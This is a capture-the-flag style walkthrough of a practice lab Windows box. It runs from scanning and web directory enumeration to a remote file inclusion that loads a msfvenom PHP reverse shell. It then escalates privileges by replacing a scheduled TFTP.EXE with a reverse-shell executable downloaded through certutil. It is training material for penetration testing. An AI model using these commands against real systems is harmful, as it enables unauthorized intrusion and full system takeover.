Target given: 192.168.53.53

Nmap on target: sudo nmap -sC -sV -v -p- 192.168.53.53 (-sC Common scripts; -sV service Versions; -v verbose (start seeing data to research results sooner); -p- all ports)

Takes some time since it runs through a lot of scripts

Nmap scan report for 192.168.53.53

Host is up (0.00032s latency).

Not shown: 65520 closed tcp ports (conn-refused)

PORT      STATE SERVICE       VERSION

21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta

| ftp-syst: 

|_  SYST: UNIX emulated by FileZilla

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds?

3306/tcp  open  mysql?

| fingerprint-strings: 

|   NULL: 

|_    Host '192.168.49.53' is not allowed to connect to this MariaDB server

4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

| http-title: Welcome to XAMPP

|_Requested resource was http://192.168.53.53:4443/dashboard/

|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

5040/tcp  open  unknown

7680/tcp  open  pando-pub?

8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

|_http-open-proxy: Proxy might be redirecting requests

| http-title: Welcome to XAMPP

|_Requested resource was http://192.168.53.53:8080/dashboard/

49664/tcp open  msrpc         Microsoft Windows RPC

49665/tcp open  msrpc         Microsoft Windows RPC

49666/tcp open  msrpc         Microsoft Windows RPC

49667/tcp open  msrpc         Microsoft Windows RPC

49668/tcp open  msrpc         Microsoft Windows RPC

49669/tcp open  msrpc         Microsoft Windows RPC

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port3306-TCP:V=7.93%I=7%D=4/22%Time=6443DF93%P=x86_64-pc-linux-gnu%r(NU

SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.53'\x20is\x20not\x20all

SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  

Host script results:

| smb2-security-mode: 

|   311: 

|_    Message signing enabled but not required

| smb2-time: 

|   date: 2023-04-22T13:25:08

|_  start_date: N/A

Results show that it's a windows device due to all the msrpc ports open.

Also 445 is SMB

Zenith AI analysis:

FileZilla FTP Server 0.9.41 beta (Port 21):

FileZilla version 0.9.41 is a beta version, which means it might not be stable and may contain undiscovered vulnerabilities. It is advisable to update to a stable version.

  

Microsoft Windows RPC (Ports 135, 49664-49669):

Remote Procedure Call (RPC) services are known to have potential vulnerabilities that can be exploited, such as buffer overflows, DoS attacks, or unauthorized access.

  

NetBIOS-ssn (Port 139) and Microsoft-ds (Port 445):

These services are used for file sharing and are associated with the SMB protocol. Vulnerabilities in these services can lead to unauthorized access or information disclosure, such as the EternalBlue exploit.

  

MySQL/MariaDB (Port 3306):

The MariaDB server is restricting access from the host '192.168.49.53'. Weak configurations and outdated versions can lead to vulnerabilities like SQL injection, privilege escalation, and information disclosure.

  

Apache HTTP Server 2.4.43 with OpenSSL/1.1.1g and PHP/7.4.6 (Ports 4443 and 8080):

Apache, OpenSSL, and PHP are well-known software with various vulnerabilities, depending on the version and configuration. The server might be susceptible to attacks like cross-site scripting (XSS), remote code execution, or man-in-the-middle (MITM) attacks if not configured properly.

  

Pando-pub? (Port 7680):

The service running on this port is not identified, which may warrant further investigation.

  

SMB Security Mode:

The SMB configuration allows message signing, but it is not required, which could expose the host to man-in-the-middle (MITM) attacks.

#windows target

So now to check the versions for vulns.

![](https://lh4.googleusercontent.com/0nrQPdSi9JZfUkHk-kK7uKIufOTowE5CDdiGbA1sAlwTIVZJaI9Ozk6F8-SawM7oG4FfT5kZfH9PjEgsOAPWftNQ_6guwD8Dxvi-0gk5uG9ROCdzKupMazNhcAGeNHuNtw=w1280)

Welp DOS won't get root so onto the next.

Maybe SMB fileshare client as an Anon / Null user?

??$ smbclient -L //192.168.53.53

Password for [WORKGROUP\kali]:

session setup failed: NT_STATUS_ACCESS_DENIED

I mean it was worth a shot. You know sometimes the easiest way into a treasure trove is through the front door 😆

Now to check the web pages on 443 and 8080 to see if there are websites since there's a Maria database on 3306 so it may be worth seeing if I can edit it through the sites

  

443 on https didn't load but 8080 did

![](https://lh3.googleusercontent.com/_-w3NWAP-RHBv_mNxlyHyNuwsBkU1y5QJhbXaU5n4t0-zCNM1q49_hMXxq6KYhpbZfUrNG0BhusiuJez2E9tDeS0Pnh-SL7TfN2HLvg2mLhChQ3FxMVBjLxXGQmApT1KOQ=w1280)

Time to rip it apart. using grep since I don't want spam on 400 status codes

???(kali?kali)-[~]

??$ dirb http://192.168.53.53:8080 | grep DIRECTORY

==> DIRECTORY: http://192.168.53.53:8080/dashboard/

==> DIRECTORY: http://192.168.53.53:8080/img/

==> DIRECTORY: http://192.168.53.53:8080/site/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/de/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/docs/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/es/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/fr/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/hu/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/images/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/Images/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/it/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/javascripts/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/jp/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/pl/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/pt_BR/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/ro/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/ru/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/stylesheets/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/tr/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/zh_CN/

==> DIRECTORY: http://192.168.53.53:8080/dashboard/zh_TW/

==> DIRECTORY: http://192.168.53.53:8080/site/css/

==> DIRECTORY: http://192.168.53.53:8080/site/fonts/

==> DIRECTORY: http://192.168.53.53:8080/site/images/

==> DIRECTORY: http://192.168.53.53:8080/site/Images/

==> DIRECTORY: http://192.168.53.53:8080/site/js/

Will hit up parent directories first then children if needed. Mass open site, dashboard, and img.

![](https://lh3.googleusercontent.com/LpcysnFLihGhRLR9gjP4VWIxkbLA9xMHVejBM794UisWKjDWN98rP6BCVKg9Lvk63dfgMt-mOx6_dqZ8mwu551COwJ5qf9IuuddocNpvRVC9Zp_dvRsMiA2ddPHlKOj0kw=w1280)

![](https://lh4.googleusercontent.com/-DQyo8CUd08UGMtjh29vvEEDcqhaSJOZ1UobYHDkAaXKjHmB41Aimol8fW3ACXG9hm_OPfuTVYo_wHLCM2eOjUlzxW0o0BnpQDk18YM_hsZJZ871ecXTs9H8bWabLU6T5A=w1280)

Well img is sus since it shows the files like that. 

Also site is sketch since it references the page as a .php file via local file inclusion LFI so maybe I can grab other things that arent local? 

My IP is 192.168.49.53 so I'll try a netcat nc reverse listener

1. Catch: sudo nc -nlvp 80 
    
2. Send: curl http://192.168.53.53:8080/site/index.php?page=http://192.168.49.53/hola
    

Also wow the proving grounds default Kali is so slow. Will need to VPN in and do these on my own kali since this is ridiculous

![](https://lh4.googleusercontent.com/oJQiCeHA-TKxwpdqHTLZvctt0GYhXeQn9HgCFC3R6wuFNO4lZQblAJMtNhlvtM4AexbqQ2Fulj3j0pLF9keJk4Jy-uo127dCWuM2hbfLEyPPi-pC1BWvv7F9xD_WwR4vLw=w1280)

Well the target system spoke spanish but no "Hola! Como Estas?" /hola page from me thus the connection closed.

At least it can connect to an attack box and try to pull a page so now to have it pull a reverse shell from me. 

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/windows/slort#h.ccufr1lgl0a1)

Weaponization

I read somewhere that it's best to first pull a script that isn't the reverse shell but a page that then downloads the rev shell once it's already been downloaded to the target server. Since the target webserver reads php we'll match format and give it a php file.

Let's craft the reverse shell via venom

Since target is running a php site we'll use a php reverse shell. Also since 445 is open we can use that as a listening port since it is already open and won't be easily blocked.

msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=445 > reverse.php

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/windows/slort#h.oujtojhx9hjm)

Exploit

Now to set up a http server so target can actually download them:

python3 -m http.server 80

curl http://192.168.53.53:8080/site/index.php?page=http://192.168.49.53/reverse.php

![](https://lh4.googleusercontent.com/5Z6CBuB4c7BGNnW1qxlNR8NRxJ4i9xQFNAvn7lvtgc9jbLd7r3aWITcJezH3WgtdlpW02MlvP-jL4ysN6CgDeqUH-jPiuE9eRept3QRVIl7cVR02QFWYGD2NR1UkctWUxA=w1280)

And I'm in. Remember to use "type" to read files in windows

whoami

slort\rupert

  

cd Desktop

dir

 Volume in drive C has no label.

 Volume Serial Number is 6E11-8C59

  

 Directory of C:\Users\rupert\Desktop

  

05/04/2022  01:53 AM    <DIR>          .

05/04/2022  01:53 AM    <DIR>          ..

04/22/2023  06:20 AM                34 local.txt

               1 File(s)             34 bytes

               2 Dir(s)  28,620,152,832 bytes free

type local.txt

6f8773150364782e22f3deafa5ae0213

After submitting the access flag I'm going for root / system

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/windows/slort#h.zciwjwknko2n)

Privilege Escalation

Time to explore

cd C:\

dir

 Volume in drive C has no label.

 Volume Serial Number is 6E11-8C59

  

 Directory of C:\

  

07/20/2020  07:08 AM    <DIR>          Backup

12/07/2019  02:14 AM    <DIR>          PerfLogs

05/04/2022  01:06 AM    <DIR>          Program Files

12/03/2021  09:22 AM    <DIR>          Program Files (x86)

12/03/2021  09:29 AM    <DIR>          Users

05/04/2022  01:52 AM    <DIR>          Windows

06/12/2020  08:11 AM    <DIR>          xampp

               0 File(s)              0 bytes

               7 Dir(s)  28,620,156,928 bytes free

cd Backup

dir

 Volume in drive C has no label.

 Volume Serial Number is 6E11-8C59

  

 Directory of C:\Backup

  

07/20/2020  07:08 AM    <DIR>          .

07/20/2020  07:08 AM    <DIR>          ..

06/12/2020  07:45 AM            11,304 backup.txt

06/12/2020  07:45 AM                73 info.txt

06/23/2020  07:49 PM            73,802 TFTP.EXE

               3 File(s)         85,179 bytes

               2 Dir(s)  28,620,156,928 bytes free

type info.txt

Run every 5 minutes:

C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

  

TFTP.exe runs every 5 minutes and probably runs with system privileges 

I'll replace TFTP.exe with my own version for a more privileged shell

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.53 LPORT=445 -f exe -o TFTP.EXE

  

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

[-] No arch selected, selecting arch: x86 from the payload

No encoder specified, outputting raw payload

Payload size: 324 bytes

Final size of exe file: 73802 bytes

Saved as: TFTP.EXE

It's normal to have 10's of thousands of bytes of bloat bs since it's windows.

Now to download new TFTP.EXE file

certutil.exe -f -urlcache -split [http://192.168.49.53:80/TFTP.EXE](http://192.168.49.53/TFTP.EXE)

Got 200 codes from my http server for the new .exe so now make a new listener and wait for the connection to catch  for a system level root before looking for the system level flags.

And GOTEM

![](https://lh3.googleusercontent.com/TKayiLGsDH8QAL0A-m6E3ToDS3NDcbzGfITc0ZvFDemI_ppfbay-eUu1Eyzdb9UaVJwz3LLJR2Ol0S11Dq_7MnXGdMin3n8w97qW5aFzFIEZuOv6LfAq3rbtUd-3ds46oQ=w1280)